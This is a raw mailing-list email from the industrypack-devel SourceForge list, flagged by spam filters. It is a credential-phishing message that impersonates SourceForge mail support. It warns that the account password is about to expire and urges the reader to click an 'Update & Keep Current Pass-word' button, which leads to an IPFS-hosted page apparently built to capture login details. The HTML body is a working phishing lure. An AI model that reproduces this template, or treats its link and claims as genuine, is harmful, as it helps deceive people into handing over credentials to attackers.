Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1B504949D50
	for <lists+industrypack-devel@lfdr.de>; Wed,  7 Aug 2024 03:20:22 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sbVLg-0002zG-Sp
	for lists+industrypack-devel@lfdr.de;
	Wed, 07 Aug 2024 01:20:20 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <no-reply@lists.sourceforge.net>) id 1sbVLf-0002z7-En
 for industrypack-devel@lists.sourceforge.net;
 Wed, 07 Aug 2024 01:20:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=2XmaFDfD/REZ5mNRKGS5TO8iVdqyKBKZl+epDWzpjUY=; b=GpzNU7xzCLCWGBuW3L7ymwRGq5
 S7bC4LrGSYcnbXhxM6tcJCfD9B0Y0G1ZagpKkUw8dJZrZQL/jiLdwWl44xYMKA7MUuY1o//1S3Lpp
 Uxf8nadp5yEOfRcMFBTVG25mjUmmSdvuLD/VB3wmdtibfg5ptpovQtKESGSZ2ANpPBeI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=2XmaFDfD/REZ5mNRKGS5TO8iVdqyKBKZl+epDWzpjUY=; b=I
 SbTIZ44MnY5fqu8kzJ4Cd6NGdvMN1Xp1Ya2JIIQWwqKlb0hUMFOyjWPH2GlhrKcK7JsWuid0eSRhI
 AlYns7l3WsHmULryJQYKPk3XIj3Wg/Quju7n6dwObaCvuaFGrLqZ4UaBW9teEiVMkxSy2iKkdp/D0
 3dV0yQESAx1WTezM=;
Received: from [112.222.75.75] (helo=tjoeungh.co.kr)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sbVLe-0003Ng-F3 for industrypack-devel@lists.sourceforge.net;
 Wed, 07 Aug 2024 01:20:19 +0000
Received: from fb.com (unknown [178.215.236.179])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by tjoeungh.co.kr (Postfix) with ESMTPSA id 5B276DB5AF35
 for <industrypack-devel@lists.sourceforge.net>;
 Tue,  6 Aug 2024 20:05:02 +0900 (KST)
To: industrypack-devel@lists.sourceforge.net
Date: 06 Aug 2024 13:01:51 -0700
Message-ID: <20240806130151.2878E795CBCE7D10@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 8.5 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: lists.sourceforge.net Your
 industrypack-devel@lists.sourceforge.net
 Account Password is set to expire 8/6/2024 1:01:51 p.m. Click the below button
 to update and keep your current password after you sign in below to prevent
 losing your email account: 
 Content analysis details:   (8.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [112.222.75.75 listed in list.dnswl.org]
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: dweb.link]
 2.7 RCVD_IN_PSBL           RBL: Received via a relay in PSBL
 [112.222.75.75 listed in psbl.surriel.com]
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [112.222.75.75 listed in wl.mailspike.net]
 5.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [178.215.236.179 listed in dnsbl-1.uceprotect.net]
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [112.222.75.75 listed in bl.score.senderscore.com]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 1.1 DATE_IN_PAST_03_06     Date: is 3 to 6 hours before Received: date
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1sbVLe-0003Ng-F3
Subject: [Industrypack-devel] [SPAM] Your
 industrypack-devel@lists.sourceforge.net password will expire 8/6/2024
 1:01:51 p.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net Mail Support via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: no-reply@lists.sourceforge.net
Content-Type: multipart/mixed; boundary="===============1913060568970771224=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============1913060568970771224==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body style=3D"MARGIN: 0.5em">
<P style=3D"FONT-SIZE: 22pt; FONT-FAMILY: system; WHITE-SPACE: normal; WORD=
-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: bold; COLOR: rgb(0,0,0); =
OUTLINE-WIDTH: medium !important; FONT-STYLE: italic; OUTLINE-STYLE: none !=
important; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal; =
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-=
decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial" align=3Dcen=
ter><FONT style=3D'FONT-FAMILY: "Arial Black"; OUTLINE-WIDTH: medium !impor=
tant; OUTLINE-STYLE: none !important' color=3D#f97206><U><FONT color=3D#115=
5cc>lists.sourceforge.net</FONT></U></FONT></P>
<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: =
normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: r=
gb(44,54,58); OUTLINE-WIDTH: medium !important; FONT-STYLE: normal; TEXT-AL=
IGN: left; OUTLINE-STYLE: none !important; ORPHANS: 2; WIDOWS: 2; MARGIN-TO=
P: 0px; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-IN=
DENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webk=
it-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial"><SPAN style=3D"FONT-FAMILY: roboto, sans-serif; OU=
TLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"></SPAN></P>=

<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, sans-serif; WHITE-SPACE: n=
ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
b(0,0,0); OUTLINE-WIDTH: medium !important; FONT-STYLE: normal; OUTLINE-STY=
LE: none !important; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING=
: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial" align=3Dcen=
ter><BR style=3D"OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !imp=
ortant"><SPAN style=3D"FONT-SIZE: 11pt; OUTLINE-WIDTH: medium !important; O=
UTLINE-STYLE: none !important"><SPAN style=3D"FONT-SIZE: 12pt; OUTLINE-WIDT=
H: medium !important; OUTLINE-STYLE: none !important">Your<SPAN><SPAN>&nbsp=
;</SPAN>&nbsp;<STRONG>industrypack-devel@lists.sourceforge.net</STRONG></SP=
AN></SPAN></SPAN>
 <SPAN style=3D"FONT-WEIGHT: bolder; OUTLINE-WIDTH: medium !important; OUTL=
INE-STYLE: none !important"><SPAN style=3D"FONT-SIZE: 11pt; OUTLINE-WIDTH: =
medium !important; OUTLINE-STYLE: none !important"><SPAN>&nbsp;</SPAN><SPAN=
 style=3D"FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE:=
 none !important">Account Password</SPAN></SPAN></SPAN><SPAN style=3D"FONT-=
SIZE: 11pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !importan=
t">
 <SPAN style=3D"OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !impo=
rtant">&nbsp;</SPAN><SPAN style=3D"FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !=
important; OUTLINE-STYLE: none !important">is&nbsp;set to&nbsp;expire 8/6/2=
024 1:01:51 p.m.</SPAN></SPAN></P>
<SPAN style=3D"FONT-SIZE: 11pt; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR=
: rgb(44,54,58); OUTLINE-WIDTH: medium !important; FONT-STYLE: normal; TEXT=
-ALIGN: left; OUTLINE-STYLE: none !important; ORPHANS: 2; WIDOWS: 2; LETTER=
-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; fon=
t-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke=
-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial"><SPAN style=
=3D"FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none =
!important"></SPAN></SPAN>
<SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none;=
 FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WI=
DOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
ckness: initial; text-decoration-style: initial;=20
text-decoration-color: initial"></SPAN>
<SPAN style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, A=
rial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: n=
one; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(38,40,42); FONT-STYLE: norma=
l; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial'></SPAN>
<SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none;=
 FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WI=
DOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
ckness: initial; text-decoration-style: initial;=20
text-decoration-color: initial"></SPAN>
<SPAN style=3D'FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPA=
CE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIG=
HT: 400; COLOR: rgb(0,0,0); OUTLINE-WIDTH: medium !important; FONT-STYLE: n=
ormal; TEXT-ALIGN: left; OUTLINE-STYLE: none !important; ORPHANS: 2; WIDOWS=
: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: =
rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
riant-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial'></SPAN>
<SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none;=
 FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WI=
DOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
ckness: initial; text-decoration-style: initial;=20
text-decoration-color: initial"></SPAN>
<SPAN style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, A=
rial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: n=
one; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(38,40,42); FONT-STYLE: norma=
l; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LET=
TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial'></SPAN>
<SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none;=
 FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WI=
DOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
ckness: initial; text-decoration-style: initial;=20
text-decoration-color: initial"></SPAN>
<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: arial, sans-serif; WHITE-SPACE: n=
ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
b(0,0,0); OUTLINE-WIDTH: medium !important; FONT-STYLE: normal; OUTLINE-STY=
LE: none !important; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING=
: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial" align=3Dcen=
ter><SPAN style=3D"FONT-FAMILY: Arial; OUTLINE-WIDTH: medium !important; OU=
TLINE-STYLE: none !important"><SPAN style=3D"FONT-SIZE: 11pt; OUTLINE-WIDTH=
: medium !important; OUTLINE-STYLE: none !important"><SPAN style=3D"FONT-SI=
ZE: 11pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"=
><SPAN style=3D"FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !important; OUTLINE-=
STYLE: none !important">
Click the below button to&nbsp;update and&nbsp;keep&nbsp;your current passw=
ord </SPAN></SPAN></SPAN></SPAN><SPAN style=3D"OUTLINE-WIDTH: medium !impor=
tant; OUTLINE-STYLE: none !important"><SPAN style=3D"FONT-SIZE: 9pt; OUTLIN=
E-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SPAN style=3D"=
FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !imp=
ortant"><SPAN style=3D"FONT-SIZE: 11pt; OUTLINE-WIDTH: medium !important; O=
UTLINE-STYLE: none !important">
<SPAN style=3D"FONT-SIZE: 11pt; OUTLINE-WIDTH: medium !important; OUTLINE-S=
TYLE: none !important"><SPAN style=3D"FONT-SIZE: 12pt; OUTLINE-WIDTH: mediu=
m !important; OUTLINE-STYLE: none !important"><SPAN style=3D"FONT-FAMILY: V=
erdana; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><=
SPAN style=3D"FONT-SIZE: 9pt; OUTLINE-WIDTH: medium !important; OUTLINE-STY=
LE: none !important"><SPAN style=3D"FONT-SIZE: 10pt; OUTLINE-WIDTH: medium =
!important; OUTLINE-STYLE: none !important">
<SPAN style=3D"FONT-FAMILY: Arial; OUTLINE-WIDTH: medium !important; OUTLIN=
E-STYLE: none !important"><SPAN style=3D"FONT-SIZE: 11pt; OUTLINE-WIDTH: me=
dium !important; OUTLINE-STYLE: none !important"><SPAN style=3D"FONT-SIZE: =
11pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SP=
AN style=3D"FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYL=
E: none !important">after you sign in below to prevent losing your email&nb=
sp;account:</SPAN></SPAN></SPAN></SPAN></SPAN></SPAN>
</SPAN></SPAN></SPAN></SPAN></SPAN></SPAN></SPAN><SPAN style=3D"FONT-SIZE: =
11pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !important"><SP=
AN style=3D"FONT-SIZE: 12pt; OUTLINE-WIDTH: medium !important; OUTLINE-STYL=
E: none !important"></SPAN></SPAN> <BR style=3D"OUTLINE-WIDTH: medium !impo=
rtant; OUTLINE-STYLE: none !important"><BR style=3D"OUTLINE-WIDTH: medium !=
important; OUTLINE-STYLE: none !important"><BR style=3D"OUTLINE-WIDTH: medi=
um !important; OUTLINE-STYLE: none !important">
<A style=3D"TEXT-DECORATION: none; BORDER-TOP: rgb(0,115,255) 1px solid; BO=
RDER-RIGHT: rgb(0,115,255) 1px solid; WIDTH: 368px; BORDER-BOTTOM: rgb(0,11=
5,255) 1px solid; COLOR: rgb(255,255,255); OUTLINE-WIDTH: medium !important=
; PADDING-BOTTOM: 12px; PADDING-TOP: 12px; OUTLINE-STYLE: none !important; =
PADDING-LEFT: 18px; MIN-HEIGHT: 32px; BORDER-LEFT: rgb(0,115,255) 1px solid=
; LINE-HEIGHT: 27px; PADDING-RIGHT: 18px; BACKGROUND-COLOR: rgb(0,115,255)"=
=20
href=3D"https://bafkreids32c6twqywzwpopcityljirmcye6gol7touugntceiicg443gti=
=2Eipfs.dweb.link/#industrypack-devel@lists.sourceforge.net" rel=3D"nofollo=
w noopener &#13;&#10;noreferrer">Update &amp; Keep&nbsp;Current Pass-word</=
A><BR style=3D"OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !impor=
tant"><BR style=3D"OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: none !i=
mportant"><BR style=3D"OUTLINE-WIDTH: medium !important; OUTLINE-STYLE: non=
e !important">
<SPAN style=3D"FONT-WEIGHT: bolder; OUTLINE-WIDTH: medium !important; OUTLI=
NE-STYLE: none !important"></SPAN><SPAN style=3D"FONT-SIZE: 12pt; OUTLINE-W=
IDTH: medium !important; OUTLINE-STYLE: none !important">lists.sourceforge.=
net<SPAN>&nbsp;</SPAN>Support&nbsp;Automated Message.</SPAN></P></BODY></HT=
ML>


--===============1913060568970771224==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1913060568970771224==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============1913060568970771224==--
